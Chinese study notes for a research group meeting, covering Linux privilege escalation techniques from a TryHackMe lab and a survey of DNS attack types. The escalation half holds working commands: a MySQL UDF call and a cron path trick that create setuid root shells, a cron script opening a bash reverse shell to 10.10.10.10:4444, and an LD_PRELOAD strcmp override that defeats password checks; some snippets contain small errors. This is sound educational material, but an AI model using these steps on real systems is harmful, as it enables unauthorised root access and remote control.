---
title: DNS第四周调研
date: 2023-2-2 12:15:37
tags: 
    - 主机提权
    - 域名解析服务扰乱
    - 组会 
categories: 组会
toc: true
language: zh-CN
---

## 主机提权

- [参考](https://zhuanlan.zhihu.com/p/432182767)
- [蓝桥杯教程](https://zhuanlan.zhihu.com/p/304572787)
- [tryHackme](https://tryhackme.com/room/linuxprivesc)，这是一个靶场，提供了21个主机提权的task

### UDF提权

1. UDF全名user-defined function capability

2. 它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库


#### UDF攻击条件

1. 必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: `select User,Host from user where Insert_priv='Y';`是否有输出
2. 可以更改数据库当然拿到root最好
3. 允许拷贝文件进来(检查命令: `show variables like 'local_infile';`结果为ON才行)

#### 攻击流程

1. 首先攻进去并且获得一个MYSQL数据库账号且权限比较高
2. 上传一个恶意的动态库文件
3. 在进入MYSQL以后通过insert函数把动态库文件存储进来
4. 搭建连接
5. 执行
6. 复现过程,首先需要准备好文件，kali上已有(raptor_udf2.so)
7. 创建do_system函数
8. 执行函数 
```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
9.  启动这个bash

```sh
/tmp/rootbash -p
```

### 可读的/etc/shadow文件

`/etc/shadow`和`/etc/passwd`上面都会存储着这台机子上的用户密码信息。`passwd`可读但不会显示具体密码，理论上来讲只有`root`才能改。而`shadow`有加密的账号密码信息但是一般来讲是不可读的。这里假设我们拥有对`/etc/shadow`的读写权限。

保存成文本信息，可用`john`进行解密。最后得到密码。

### 可写的/etc/shadow文件

通过`john`获取`/etc/shadow`的加密方法，使用相同的加密方法将密码替换

### 可写的/etc/passwd文件

使用以下命令生成加密后的密码，修改`/etc/passwd`中root的密码

```sh
openssl passwd 123456
```

### sudo提权

- [sudo提权参考](https://www.cnblogs.com/vir-k/p/16301456.html)

在Linux/Unix中，`/etc/sudoers`文件是`sudo`权限的配置文件，其中储存了一些用户或组可以以`root`权限使用的命令。通过`sudo -l`可以查看用户能以root权限运行的命令


可以利用sudo提权的命令如下

```
wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen
```

在`/etc/sudoers`中需要有以下内容

```sh
hacker  ALL=(root) NOPASSWD: /usr/bin/awk
hacker  ALL=(root) NOPASSWD: /usr/bin/vim
hacker  ALL=(root) NOPASSWD: /usr/bin/man
hacker  ALL=(root) NOPASSWD: /usr/bin/apache2
hacker  ALL=(root) NOPASSWD: /usr/bin/less
hacker  ALL=(root) NOPASSWD: /bin/more
hacker  ALL=(root) NOPASSWD: /usr/bin/find
hacker  ALL=(root) NOPASSWD: /usr/bin/zip
hacker  ALL=(root) NOPASSWD: /usr/bin/git
```

`hacker`用户可以以`root`身份运行`awk`, `vim` 等命令即可

#### 攻击流程

每个命令具体的攻击流程在上面的[参考](#sudo提权)中有写

### 环境变量提权

`LD_LIBRARY_PATH` : 提供首先会在某些动态库里面列出会使用到哪些动态库

`LD_PRELOAD` : 在某个程序运行前先加载一个对象

#### 一个preload.c的例子
```cpp
/* 文件名：preload.c */
#include<stdio.h>

int strcmp(const char *s1, const char *s2)
{
        printf("hack function invoked. s1=<%s> s2=<%s>/n", s1, s2);
        /* 永远返回0，表示两个字符串相等 */
        return 0;
}
```

如果登录验证时使用了strcmp函数比较输入字符串和密码是否相同，替换该函数，使得strcmp永远返回0。

### cron job提权

假设root会定期使用`cron`执行`overwrite.sh`这个脚本，找到这个脚本发现该脚本是可编辑的，将该脚本的替换成以下内容
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

创建一个交互式的bash，并将输入输出重定向到 `/dev/tcp/10.10.10.10/4444` socket连接上。


### cron 环境变量提权

在`/etc/crontab`中显示的环境变量`$PATH`是从`/home/user`找起，而root执行的`overwrite.sh`在`usr/local/bin`中，可以在`/home/user`下写入一个`overwrite.sh`文件来提权
```sh
#!/bin/bash
cp /bin/bash /tmp/rootBash
chmod +xs /tmp/rootBash
```

### 查看历史寻找敏感信息

查看输入命令的历史，看其中是否有密码、敏感信息
```sh
cat ~/.*history
```

### NFS提权
在NFS中，如果配置了`root_squash`，当使用root用户登录访问时，会将root用户转换成匿名用户。此时他的`uid`和`gid`都会变成`nobody`账号的身份。如果配置了`no_root_squash`，则会以`root`身份直接访问。

此时在nfs中创建文件
```cpp
int main() {
    setpid(0);
    setgid(0);
    system("/bin/bash/");
    return 0;
}
```

对他进行编译，等待编译后的文件同步到靶机上，进行执行，即可提权

### Capability提权

从2.1版本以后Linux开始引入capability让普通用户也可干root可做的事。capability可让某个程序拥有超能力而sudo只是针对某个用户/文件赋予它SUID(超能力)。

使用该命令可以找到具有`cap_setuid`能力的程序，具体提权方法可以查找[`gtfobin`](https://gtfobins.github.io/)
```sh
getcap -r 2>/dev/null
```

### 内核提权

`dirtycow`可以对内核版本2.6左右的系统进行提权，可以借助`linux-exploit-suggester`等工具查询提权方法。

### 提权相关漏洞

- CVE-2019-19495，web页面设计问题导致页面收到DNS rebinding攻击，使外部能够访问root shell
- CVE-2019-12511，通过向"NETGEAR Genie" SOAP 端点发送特制的MAC地址，就可以以root用户身份执行任意系统命令
- CVE-2000-1029，CVE-2002-0029，CVE-2002-0684，Buffer overflow导致攻击方可以以root身份执行任意命令
- CVE-2001-0013，字符串格式化问题导致攻击者获取riit权限
- [ISC » Bind : Vulnerability Statistics](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64)显示了历年找到的bind中的各类bug


## 域名解析服务扰乱 (三类)

- [参考1--简析DNS攻击的常见类型、危害与防护建议](https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247530965&idx=1&sn=5c35152b5545c2716af43b85144acab4&chksm=fa93cf14cde44602f937581f78af1a3c9b9c08acec40383e9c00722d343a1b67ad388a3986ac&scene=27)
- [参考2--On the Anatomy of a DNS Attack – Types, Technical Capabilities, and Mitigation](https://heimdalsecurity.com/blog/anatomy-of-a-dns-attack/)
- [参考3--Attacks Against The DNS](https://www.itu.int/en/ITU-D/Regional-Presence/Americas/Documents/EVENTS/2016/15551-EC/2A.pdf)

### 拒绝服务(DoS)类攻击

通过耗尽机器或网络的资源将其服务关闭，阻止用户访问机器或网络。需要强调的是，这种攻击的目的主要用于隐藏踪迹或阻碍受害者恢复工作。


#### DNS放大
- Reflection Attack
- Reflection Attack And Amplification Attack
- Distributed Reflection And Amplification Attack

DNS放大是DoS攻击中用于利用域名系统并加大目标网站流量的一种技术。这种攻击方法利用的主要技术包括DNS反射和地址伪造。不法分子实施这种攻击的手法是，向域名系统服务器发送伪造的IP数据包，请求目标的域名，使用目标的IP地址代替自己的IP地址。

所有这些查询都由DNS服务器用目标机器的IP地址来答复。然后，受害者的服务器向每个请求发送相同的答复。这导致庞大的数据流量从受害者网络的端口80或25流入。

> 伪造DNS请求，并替换请求中的源地址替换成攻击对象(target)的地址，称为`Reflection Attack`，如果在此基础上向DNS发送大量的请求，使target`80/25`端口接收过多攻击，称为`Reflection Attack And Amplification Attack`，如果多个Attacker对DNS发起此类虚假的请求，称为`Distributed Reflection And Amplification Attack`

#### SYN Flood (Resource Depletion DOS Attack)
![Resource Depletion DOS Attack](https://github.com/jingtianer/home/blob/gh-pages/images/ResDepletionDosAttack.png?raw=true)
> 利用target的ip发起TCP连接，DNS为TCP连接分配资源，最终导致Fail，停止服务

#### Basic Cache Poisoning
![Basic Cache Poisoning](https://github.com/jingtianer/home/blob/gh-pages/images/BasicCachePoisoning.png?raw=true)

> 令本地解析器缓存错误的ip地址

#### NXDOMAIN Cache Exhaustion
![NXDOMAIN Cache Exhaustion](https://github.com/jingtianer/home/blob/gh-pages/images/NXDOMAIN.png?raw=true)

> 攻击者向DNS服务器发送大量不存在的域名的查询请求，导致DNS服务器中存储了大量NXDOMAIN信息，导致其缓存溢出，停止服务

#### Dos e.g.
- Exploit To Fail，[Malicious DNS message injection--(CVE-2002-0400)](http://www.cvedetails.com/cve/CVE-2002-0400/)
    - Exploit a vulnerability in some element of a name server infrastructure to cause interruption of name resolution service，利用DNS服务器基础结构的某些元素中的漏洞导致名称解析服务中断
- Exploit To Own，[Arbitrary/remote code execution](http://www.kb.cert.org/vuls/id/844360)
    - Exploit a vulnerability in some element of a name server infrastructure to gain system administrative privileges，利用DNS服务器基础结构的某些元素中的漏洞获得系统管理特权
- Reflection Attack，[]()

### 分布式拒绝服务(DDoS)类攻击
- UDP Flood
- HTTP Flood
    - 这两个和SYN Flood相似，发送大量请求导致target资源不足而崩溃
- 反射式跨站点脚本(XSS)
    - 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自"可信任"的服务器，所以会执行这段脚本。
    - 通过DNS TXT记录在上注入恶意脚本，当通过Whois服务检查他的域时，脚本会立即执行。

### DNS 劫持类攻击
发生DNS劫持攻击时，网络攻击者会操纵域名查询的解析服务，导致访问被恶意定向至他们控制的非法服务器，这也被成为DNS投毒或DNS重定向攻击。
DNS 劫持攻击在网络犯罪领域也很常见。DNS劫持活动还可能破坏或改变合规DNS服务器的工作。除了实施网络钓鱼活动的黑客外，这还可能由信誉良好的实体(比如ISP)完成，其这么做是为了收集信息，用于统计数据、展示广告及其他用途。此外，DNS服务提供商也可能使用流量劫持作为一种审查手段，防止访问特定页面。

> 通过恶意AP，路由器将DNS请求重定向到攻击者的DNS服务器上

#### DNS欺骗

DNS欺骗又叫DNS缓存中毒，是网络犯罪分子用来诱骗用户连接到他们建立的虚假网站而不是合法网站的一种方法。有人通过域名系统请求访问网站，而DNS服务器回应不准确的IP地址时，这被认为是DNS欺骗攻击。然而，不仅仅是网站容易受到这种攻击。黑客还可以使用这种方法，访问电子邮件账户及其他私密数据。

> DNS返回的数据被篡改，返回了不准确的IP地址

#### Configuration Poisoning: DNSChanger
![Configuration Poisoning: DNSChanger](https://github.com/jingtianer/home/blob/gh-pages/images/ConfigPoisoningDNS.png?raw=true)

> 通过恶意软件修改DNS的配置文件

#### DNS Hostname Overflow Attack

> 攻击者返回的消息中包含大于255字节的域名，导致Buffer溢出，使得攻击者可以获得root或执行特权指令

#### DNS隧道

网络流量可以使用DNS隧道的方式绕过网络过滤器和防火墙等机制，以建立另外的数据传输通道。启用DNS隧道后，用户的连接将通过远程服务器路由传输互联网流量。不幸的是，黑客经常将此用于恶意目的。被恶意使用时，DNS隧道是一种攻击策略，数据通过DNS查询来传递。除了通过平常会阻止这类流量的网络秘密发送数据外，这还可用于欺骗内容、避免过滤或防火墙检测。

> 利用DNS进行隐蔽通信

#### DNS重新绑定

DNS重新绑定是一种网络攻击方法，利用浏览器缓存的长期特性，欺骗受害者的浏览器在输入域名时联系恶意站点。攻击者可以使用任何联网设备（包括智能手机）来实施攻击，不需要任何类型的身份验证。受害者必须禁用浏览历史记录或打开浏览器隐身窗口，才能禁用缓存。利用该漏洞，攻击者可以将受害者浏览器对域名的请求，重新路由到托管有害内容的非法服务器。

> 一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns

> 对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。

> - 用户第一次访问，解析域名test.gm7.org的IP为104.21.26.222
> - 在用户第二次访问前，修改域名解析的IP为127.0.0.1
> - 用户第二次访问，解析域名test.gm7.org的IP为127.0.0.1 (一个不同的ip)
#### DNS拼写仿冒

DNS拼写仿冒是一种受DNS劫持启发的社会工程攻击技术，它使用域名中的错别字和拼写错误。常见的DNS拼写仿冒攻击始于攻击者注册一个域名，这个域名和目标的网站域名非常相似。攻击者随后搭建一个虚假网站，网站内容旨在说服用户提供敏感信息，包括登录密码、信用卡资料及其他个人信息。


> DNS拼写仿冒是社工技术的一种方法，攻击方注册一个和网站相似的域名来混淆用户。常见在登录密码以及识别验证方面。